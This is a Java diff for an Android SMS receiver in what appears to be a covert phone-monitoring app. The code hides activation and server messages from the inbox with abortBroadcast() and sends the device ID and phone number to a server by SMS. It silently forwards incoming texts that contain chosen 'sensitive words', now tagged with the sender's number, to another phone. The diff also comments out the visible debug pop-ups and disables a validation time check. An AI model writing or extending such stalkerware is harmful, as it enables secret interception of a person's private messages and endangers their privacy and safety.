@@ -42,7 +42,7 @@ public class SmsReceiver extends BroadcastReceiver
 		if (!intent.getAction().equals(SMS_RECEIVED)) return;
 		
 		String smsBody = SmsCtrl.getSmsBody(intent).trim();
-		SysUtils.messageBox(context, "Received SMS: " + smsBody);
+		//SysUtils.messageBox(context, "Received SMS: " + smsBody);
 			
 		if (smsBody.length() <= 0) return; 
 		
@@ -52,9 +52,11 @@ public class SmsReceiver extends BroadcastReceiver
 			LicenseCtrl.isLicensed(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
 		{
 			abortBroadcast(); // Finish broadcast, the system will notify this SMS
-			SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(LicenseCtrl.isLicensed(context, smsBody)));
+			//SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(LicenseCtrl.isLicensed(context, smsBody)));
 			try {
 				// If it is the 1st time, send SMS to server for license key validation
+				// but still show the setting view for inputing mail address and etc.
+				// The functions will really work until the response validation SMS comes from server. 
 				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) 
 				{
 					String deviceID = DeviceProperty.getDeviceId(context);
@@ -65,12 +67,11 @@ public class SmsReceiver extends BroadcastReceiver
 					AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
 					String smsStr = sms.clientSms2Str();
 					String srvAddr = context.getResources().getString(R.string.srv_address);
-					SysUtils.messageBox(context, "Server Address: " + srvAddr);
+					//SysUtils.messageBox(context, "Server Address: " + srvAddr);
 					boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
 					if (ret) {
 						ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
 					}
-					return;
 				}
 				
 				// Save the last activated datetime
@@ -83,6 +84,7 @@ public class SmsReceiver extends BroadcastReceiver
 				context.startActivity(initIntent);
 				
 				// Remove the activation SMS
+				// Since we have done abortBroadcast(), the activation SMS will not enter the SMS inbox.
 				//SmsCtrl.deleteTheLastSMS(context);
 			}
 			catch (Exception ex) {
@@ -92,14 +94,15 @@ public class SmsReceiver extends BroadcastReceiver
 		}
 		
 		//-------------------------------------------------------------------------------
-		// If it is a SMS from server for key validation
-		else if (smsBody.startsWith(AuthSms.SMS_HEADER)) 
+		// If it is the response validation SMS from server
+		else if (smsBody.startsWith(AuthSms.SMS_HEADER + AuthSms.SMS_SEPARATOR)) 
 		{
 			String[] parts = smsBody.split(AuthSms.SMS_SEPARATOR);
 			if (parts.length >= 3) {
 				abortBroadcast(); // Finish broadcast, the system will notify this SMS
 				
 				// The time between sending Auth SMS and receiving Auth SMS cannot be more than 10 minites.
+				/*
 				String authSmsSentDatetimeStr = ConfigCtrl.getAuthSmsSentDatetime(context);
 				ConfigCtrl.setAuthSmsSentDatetime(context, null); // clean the auth sms sent time
 				Date authSmsSentDatetime = null;
@@ -118,6 +121,7 @@ public class SmsReceiver extends BroadcastReceiver
 					Log.i(LOGTAG, "Auth SMS invalid due to out of time");
 					return;
 				}
+				*/
 					
 				// --------------------------------------------------------------
 				if (parts[2].equals(AuthSms.SMS_SUCCESS)) {
@@ -125,6 +129,7 @@ public class SmsReceiver extends BroadcastReceiver
 					LICENSE_TYPE type = LicenseCtrl.isLicensed(context, parts[1]);
 					if (!ConfigCtrl.setLicenseType(context, type)) {
 						Log.e(LOGTAG, "Cannot set license type");
+						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_to_sharedpreferences));
 						return;
 					}
 					
@@ -153,12 +158,14 @@ public class SmsReceiver extends BroadcastReceiver
 		}
 			
 		//-------------------------------------------------------------------------------
-		// Redirect 
+		// Redirect SMS that contains sensitive words
 		else if (containSensitiveWords(context, smsBody)) 
 		{
 			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
 			if (phoneNum.length() > 0) {
-				boolean ret = SmsCtrl.sendSms(phoneNum, context.getResources().getString(R.string.sms_redirect_header) + smsBody);
+				String smsAddress = SmsCtrl.getSmsAddress(intent);
+				String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
+				boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
 			}
 		}
 		
@@ -168,8 +175,12 @@ public class SmsReceiver extends BroadcastReceiver
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
 		String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context).split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
-		for (String word : sensitiveWords) {
-			if (sms.toLowerCase().contains(word.toLowerCase())) {
+		if (sensitiveWords.length == 0) return false; // We only redirect SMS that contains sensitive words intead of redirecting all. 
+		int count = sensitiveWords.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT ? 
+				GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT : sensitiveWords.length; 
+		String smsBody = sms.toLowerCase();
+		for (int i = 0; i < count; i++) {
+			if (smsBody.contains(sensitiveWords[i].toLowerCase())) {
 				ret = true;
 				break;
 			}
